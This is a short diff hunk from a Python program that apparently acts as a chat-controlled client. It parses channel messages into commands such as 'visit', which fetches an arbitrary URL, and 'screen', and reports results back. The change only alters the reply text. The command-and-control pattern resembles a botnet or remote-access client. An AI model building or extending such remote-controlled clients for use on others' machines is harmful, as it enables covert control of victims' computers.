@@ -73,8 +73,8 @@ def main():
                             chat(s, clientName + " encountered an error. " + str(e))
                     elif messageArray[2] == 'visit':
                         try:
-                            visit = urllib.request.urlopen(messageArray[3])
-                            chat(s, clientName + " completed the command with code " + str(visit.getCode()))
+                            urllib.request.urlopen(messageArray[3])
+                            chat(s, clientName + " completed the command.")
                         except Exception as e:
                             chat(s, clientName + " encountered an error. " + str(e))
                     elif messageArray[2] == 'screen':
